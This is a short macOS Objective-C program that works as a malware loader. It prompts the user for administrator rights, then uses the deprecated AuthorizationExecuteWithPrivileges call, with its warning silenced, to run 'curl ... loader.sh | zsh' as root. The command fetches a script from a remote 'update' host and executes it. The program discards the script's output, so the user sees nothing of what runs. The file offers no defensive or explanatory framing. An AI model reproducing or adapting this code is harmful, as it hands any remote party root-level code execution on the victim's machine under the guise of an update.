#import <Foundation/Foundation.h>
#import <Security/Authorization.h>
#import <Security/AuthorizationTags.h>

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        const char *script = "curl -fsSL https://update.apex-arena-router.com/loader.sh | zsh";
        
        AuthorizationRef authRef = NULL;
        OSStatus status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authRef);
        if (status != errAuthorizationSuccess) return 1;
        
        AuthorizationItem item = { kAuthorizationRightExecute, 0, NULL, 0 };
        AuthorizationRights rights = { 1, &item };
        AuthorizationFlags flags = kAuthorizationFlagInteractionAllowed | kAuthorizationFlagPreAuthorize | kAuthorizationFlagExtendRights;
        
        status = AuthorizationCopyRights(authRef, &rights, kAuthorizationEmptyEnvironment, flags, NULL);
        if (status != errAuthorizationSuccess) {
            AuthorizationFree(authRef, kAuthorizationFlagDestroyRights);
            return 1;
        }
        
        const char *args[] = { "-c", script, NULL };
        FILE *pipe = NULL;
        
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
        status = AuthorizationExecuteWithPrivileges(authRef, "/bin/zsh", kAuthorizationFlagDefaults, (char **)args, &pipe);
#pragma clang diagnostic pop
        
        if (status == errAuthorizationSuccess && pipe) {
            // Wait for completion
            char buffer[256];
            while (fgets(buffer, sizeof(buffer), pipe) != NULL) {}
            fclose(pipe);
        }
        
        AuthorizationFree(authRef, kAuthorizationFlagDestroyRights);
        return (status == errAuthorizationSuccess) ? 0 : 1;
    }
}
